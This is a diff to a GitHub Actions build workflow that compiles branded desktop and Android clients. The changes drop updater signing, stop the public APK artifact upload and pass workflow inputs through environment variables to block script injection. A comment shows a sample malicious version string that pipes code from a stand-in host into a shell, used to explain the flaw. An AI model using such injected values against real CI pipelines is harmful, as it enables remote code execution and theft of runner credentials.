@@ -2,11 +2,13 @@
 # build.yml  —  lives in the PUBLIC repo:  codeman9528/QuasarAPP-build
 # Copy this file to that repo at  .github/workflows/build.yml
 #
-# Heavy, free compile of a branded Quasar client. NO real signing key here:
-# desktop updater artifacts are built with a throwaway ephemeral key (.sig
-# discarded); the Android APK is left UNSIGNED. Everything is uploaded to R2
-# staging under one $BUILD_ID/ prefix, then ONE hand-off dispatches the private
-# repo's sign.yml which re-signs with the real L3 / release keys.
+# Heavy, free compile of a branded Quasar client. NO signing key here at all.
+# Desktop needs none: the client has no self-updater, so nothing is signed —
+# users download the installer from the operator's own link. Only the Android
+# APK still needs a real key (the OS refuses an upgrade signed by anything else),
+# so the APK is left UNSIGNED here and sign.yml (private repo) signs just that.
+# Everything is uploaded to R2 staging under one $BUILD_ID/ prefix, then ONE
+# hand-off dispatches sign.yml.
 #
 # ── Single-workflow fan-in (ADR-013 + console targets) ───────────────────────
 # The console passes `targets` (windows,macos,linux,android,androidtv). A `setup`
@@ -41,12 +43,19 @@ concurrency:
   group: build-${{ inputs.slug }}-${{ inputs.version }}
   cancel-in-progress: false
 
+# Workflow inputs are exposed ONLY as environment variables and must be read as
+# "$SLUG" / "$VERSION" / … inside `run:` blocks. Never write ${{ inputs.* }}
+# directly in a script: GitHub substitutes the expression into the script text
+# BEFORE bash parses it, so a version like `1.0$(curl -s evil/x|sh)` executes on
+# a runner holding the private-repo deploy key and the R2 staging credentials —
+# from there an attacker can overwrite another tenant's unsigned artifacts before
+# sign.yml signs them. (The console also rejects such versions; this is the
+# second layer.) Passing them through `env:` keeps them as inert data.
 env:
   SLUG:     ${{ inputs.slug }}
   VERSION:  ${{ inputs.version }}
   BUILD_ID: ${{ inputs.build_id }}
-  # Operator-wide PUBLIC key — repo *variable*, not a secret (pubkeys aren't secret).
-  TAURI_UPDATER_PUBKEY:  ${{ vars.TAURI_UPDATER_PUBKEY }}
+  TARGETS:  ${{ inputs.targets }}
   # R2 staging endpoint + WRITE-ONLY-to-staging token (leak = throwaway bucket only).
   R2_ENDPOINT:           ${{ vars.R2_ENDPOINT }}            # https://<acct>.r2.cloudflarestorage.com
   AWS_ACCESS_KEY_ID:     ${{ secrets.R2_STAGING_KEY_ID }}
@@ -67,7 +76,7 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          targets="${{ inputs.targets }}"
+          targets="$TARGETS"
           [ -z "$targets" ] && targets="windows,macos,linux,android,androidtv"
           matrix="[]"; android=false
           IFS=',' read -ra T <<< "$targets"
@@ -112,7 +121,7 @@ jobs:
           set -euo pipefail
           sha="$(git rev-parse HEAD)"
           echo "sha=$sha" >> "$GITHUB_OUTPUT"
-          echo "· built ${{ inputs.slug }} v${{ inputs.version }} ${{ matrix.arch }} from private@$sha" \
+          echo "· built $SLUG v$VERSION ${{ matrix.arch }} from private@$sha" \
             | tee -a "$GITHUB_STEP_SUMMARY"
 
       - name: Linux build deps
@@ -141,25 +150,18 @@ jobs:
           pnpm -C apps/ui build
 
       - name: Apply brand (patches tauri.conf.json + icons + .cargo env)
-        run: cargo run -p quasar-builder -- apply --brand "brands/${{ inputs.slug }}/brand.yaml"
+        run: cargo run -p quasar-builder -- apply --brand "brands/$SLUG/brand.yaml"
 
       - name: Regenerate icon set from brand icon.png (if the console uploaded one)
         shell: bash
         run: |
           set -euo pipefail
-          if [ -f "brands/${{ inputs.slug }}/icon.png" ]; then
-            echo "branding app icon from brands/${{ inputs.slug }}/icon.png"
-            cargo tauri icon "brands/${{ inputs.slug }}/icon.png" -o crates/tauri-app/icons
+          if [ -f "brands/$SLUG/icon.png" ]; then
+            echo "branding app icon from brands/$SLUG/icon.png"
+            cargo tauri icon "brands/$SLUG/icon.png" -o crates/tauri-app/icons
           else
             echo "no brand icon.png — using repo default icons"
           fi
-
-      - name: Generate EPHEMERAL signing key (discarded; real key is in sign.yml)
-        shell: bash
-        run: |
-          cargo tauri signer generate -w "$RUNNER_TEMP/eph.key" -p "" >/dev/null 2>&1
-          echo "TAURI_SIGNING_PRIVATE_KEY=$(cat "$RUNNER_TEMP/eph.key")" >> "$GITHUB_ENV"
-          echo "TAURI_SIGNING_PRIVATE_KEY_PASSWORD=" >> "$GITHUB_ENV"
 
       - name: Fetch geo databases (bundled so the client loads geoip locally,
               not from GitHub at runtime — blocked behind the GFW; ADR-014 §6)
@@ -201,7 +203,7 @@ jobs:
         if: matrix.arch == 'darwin-universal'
         run: rustup target add aarch64-apple-darwin x86_64-apple-darwin
 
-      - name: Build app (installers + updater archives)
+      - name: Build app (installers)
         shell: bash
         run: |
           if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
@@ -210,7 +212,7 @@ jobs:
             cargo tauri build
           fi
 
-      - name: Collect updater archive + installer
+      - name: Collect installer
         id: collect
         shell: bash
         run: |
@@ -223,15 +225,11 @@ jobs:
           fi
           case "${{ matrix.arch }}" in
             linux-*)
-              # Tauri 2 signs the AppImage directly (…AppImage + …AppImage.sig),
-              # NOT a .AppImage.tar.gz. The AppImage is both the updater artifact
-              # (auto-update only works for AppImage on Linux) and a portable
-              # direct-download installer.
-              up=$(ls "$base"/appimage/*.AppImage | head -1)
-              inst="$up"
+              # The AppImage is a portable, self-contained installer.
+              inst=$(ls "$base"/appimage/*.AppImage | head -1)
               # Also ship .deb + .rpm: they use the SYSTEM webkit2gtk (a package
               # dependency, not bundled) so they're ~1/3 the AppImage's size. They
-              # are install-only (no auto-update — that stays AppImage-only). Staged
+              # Staged under their own platform keys (linux-*-deb / -rpm) so
               # under their own platform keys (linux-*-deb / -rpm) so installers.json
               # lists all three. Best-effort (a target may not have built).
               deb=$(ls "$base"/deb/*.deb 2>/dev/null | head -1 || true)
@@ -242,12 +240,8 @@ jobs:
               echo "rpm_name=$([ -n "$rpm" ] && basename "$rpm" || echo '')" >> "$GITHUB_OUTPUT"
               ;;
             windows-*)
-              # Tauri 2: the NSIS -setup.exe is the updater artifact (+ .sig);
-              # there is no -setup.nsis.zip. It's also the direct-download installer.
-              up=$(ls "$base"/nsis/*-setup.exe | head -1)
-              inst="$up" ;;
+              inst=$(ls "$base"/nsis/*-setup.exe | head -1) ;;
             darwin-*)
-              up=$(ls "$base"/macos/*.app.tar.gz)
               # Ship a .pkg installer, NOT the .dmg. A pkg installer writes the app
               # FRESH into /Applications, so the installed app carries no
               # com.apple.quarantine flag → it launches with zero Gatekeeper
@@ -255,10 +249,32 @@ jobs:
               # un-notarized clients ship). A dragged-out .dmg app inherits the
               # download's quarantine → the "已损坏" dead-end on Apple Silicon.
               # Unsigned pkg over an ad-hoc-signed app — no Apple Developer account.
-              app=$(ls -d "$base"/macos/*.app | head -1)
+              # Locate the .app with a shell glob, not `ls` — a glob keeps the exact
+              # bytes of a non-ASCII product name and never needs a subshell.
+              app=""
+              for d in "$base"/macos/*.app; do [ -d "$d" ] && { app="$d"; break; }; done
+              if [ -z "$app" ]; then
+                echo "::error::no .app under $base/macos"; ls -la "$base/macos" || true; exit 1
+              fi
               appname=$(basename "$app" .app)
-              ident=$(/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" "$app/Contents/Info.plist")
-              ver=$(/usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" "$app/Contents/Info.plist")
+
+              # Identifier + version come from the SOURCE OF TRUTH (tauri.conf.json,
+              # which quasar-builder just patched from brand.yaml) and the workflow
+              # input — NOT read back out of the built Info.plist.
+              #
+              # This step had never once succeeded on macOS: every macOS job in the
+              # pipeline's history died here on
+              #   Print: Entry, ":CFBundleIdentifier", Does Not Exist
+              # PlistBuddy prints an extra "File Doesn't Exist" line when the file is
+              # missing, and that line was absent — so the plist existed but lacked
+              # the key. Rather than keep guessing why the bundler omitted it, stop
+              # depending on the round-trip: we already know both values.
+              ident=$(python3 -c "import json;print(json.load(open('crates/tauri-app/tauri.conf.json')).get('identifier',''))")
+              ver="$VERSION"
+              if [ -z "$ident" ]; then
+                echo "::error::tauri.conf.json has no identifier — brand apply failed?"; exit 1
+              fi
+              echo "· pkg identifier=$ident version=$ver app=$app"
               a="${{ matrix.arch }}"; a="${a#darwin-}"
               comp="$RUNNER_TEMP/component.pkg"
               inst="$RUNNER_TEMP/${appname}_${ver}_${a}.pkg"
@@ -286,12 +302,10 @@ jobs:
                 > "$dist"
               productbuild --distribution "$dist" --package-path "$RUNNER_TEMP" "$inst" ;;
           esac
-          echo "updater=$up" >> "$GITHUB_OUTPUT"
-          echo "updater_name=$(basename "$up")" >> "$GITHUB_OUTPUT"
           echo "installer=$inst" >> "$GITHUB_OUTPUT"
           echo "installer_name=$([ -n "$inst" ] && basename "$inst" || echo '')" >> "$GITHUB_OUTPUT"
 
-      - name: Upload UNSIGNED updater + installer to R2 staging
+      - name: Upload installer to R2 staging
         shell: bash
         env:
           # Force legacy checksum behavior — aws cli v2.23+ CRC checksums make
@@ -300,21 +314,14 @@ jobs:
           AWS_RESPONSE_CHECKSUM_VALIDATION: when_required
         run: |
           set -euo pipefail
-          bid="${{ inputs.build_id }}"; arch="${{ matrix.arch }}"
-          # A universal macOS build is ONE fat artifact that must be offered to
-          # BOTH darwin-aarch64 AND darwin-x86_64 clients: the Tauri updater/client
-          # reports the RUNNING arch, never "universal", so a lone darwin-universal
-          # manifest key matches nobody → macOS auto-update silently dead. Publish
-          # the SAME file under both real-arch keys (updater + installer).
+          bid="$BUILD_ID"; arch="${{ matrix.arch }}"
+          # A universal macOS build is ONE fat artifact that serves both Apple
+          # Silicon and Intel. Publish it under both real-arch keys so a per-arch
+          # consumer of the staging layout still finds it.
           if [ "$arch" = "darwin-universal" ]; then keys="darwin-aarch64 darwin-x86_64"; else keys="$arch"; fi
           # Single-part PUT (s3api put-object), NOT `aws s3 cp`: cp goes multipart
           # for files >8MB and R2 bucket-scoped tokens reject CreateMultipartUpload.
           for k in $keys; do
-            aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
-              --bucket "$STAGING_BUCKET" \
-              --key "$bid/updater/$k/${{ steps.collect.outputs.updater_name }}" \
-              --body "${{ steps.collect.outputs.updater }}" >/dev/null
-            # Installer (direct download; not Tauri-signed).
             if [ -n "${{ steps.collect.outputs.installer_name }}" ]; then
               aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
                 --bucket "$STAGING_BUCKET" \
@@ -391,7 +398,7 @@ jobs:
 
       - name: Apply brand
         if: inputs.slug != ''
-        run: cargo run -p quasar-builder -- apply --brand "brands/${{ inputs.slug }}/brand.yaml"
+        run: cargo run -p quasar-builder -- apply --brand "brands/$SLUG/brand.yaml"
 
       # Regenerate the FULL icon set (incl. Android launcher mipmaps) from the
       # operator's uploaded logo so the console's custom icon reaches the APK.
@@ -400,9 +407,9 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          if [ -f "brands/${{ inputs.slug }}/icon.png" ]; then
-            echo "branding app icon from brands/${{ inputs.slug }}/icon.png"
-            cargo tauri icon "brands/${{ inputs.slug }}/icon.png" -o crates/tauri-app/icons
+          if [ -f "brands/$SLUG/icon.png" ]; then
+            echo "branding app icon from brands/$SLUG/icon.png"
+            cargo tauri icon "brands/$SLUG/icon.png" -o crates/tauri-app/icons
           else
             echo "no brand icon.png — using repo default icons"
           fi
@@ -415,7 +422,7 @@ jobs:
         if: inputs.slug != ''
         shell: bash
         run: |
-          SRC="brands/${{ inputs.slug }}/icon.png"
+          SRC="brands/$SLUG/icon.png"
           DEST="crates/tauri-app/android/app/src/main/res/drawable/tv_banner.png"
           [ -f "$SRC" ] || { echo "no brand icon — keeping default TV banner"; exit 0; }
           sudo apt-get install -y imagemagick >/dev/null 2>&1 || true
@@ -478,7 +485,7 @@ jobs:
           # already productName-named; keep Android consistent).
           product="$(python3 -c "import json;print(json.load(open('crates/tauri-app/tauri.conf.json'))['productName'])")"
           safe="$(printf '%s' "$product" | tr ' /' '__')"
-          newname="${safe}_${{ inputs.version }}_universal.apk"
+          newname="${safe}_${VERSION}_universal.apk"
           mv "$apk" "$(dirname "$apk")/$newname"
           apk="$(dirname "$apk")/$newname"
           echo "apk=$apk" >> "$GITHUB_OUTPUT"
@@ -498,13 +505,12 @@ jobs:
             --body "${{ steps.collect.outputs.apk }}" >/dev/null
           echo "· uploaded to s3://$STAGING_BUCKET/$BUILD_ID/installer/android-universal/${{ steps.collect.outputs.name }}"
 
-      # Keep the raw APK as a run artifact for manual QA installs.
-      - name: Upload APK run-artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: quasar-android-${{ inputs.slug || 'default' }}-release-unsigned
-          path: ${{ steps.collect.outputs.apk }}
-          retention-days: 7
+      # NO run-artifact upload here. This repo is PUBLIC, and run artifacts are
+      # downloadable by any GitHub account for their whole retention window — the
+      # APK embeds the brand's oss_enc_key, invite code, panel endpoints and
+      # identity. The same APK is already staged to R2 (previous step) where
+      # sign.yml picks it up, so nothing is lost; for manual QA, pull it from the
+      # staging bucket instead.
 
   # ── Fan-in: dispatch sign.yml ONCE after all selected builds succeed ─────────
   handoff:
@@ -530,8 +536,8 @@ jobs:
           event-type: brand-build-signed
           client-payload: |
             {
-              "build_id": "${{ inputs.build_id }}",
-              "slug": "${{ inputs.slug }}",
-              "version": "${{ inputs.version }}",
+              "build_id": ${{ toJSON(inputs.build_id) }},
+              "slug": ${{ toJSON(inputs.slug) }},
+              "version": ${{ toJSON(inputs.version) }},
               "notes": ${{ toJSON(inputs.notes) }}
             }
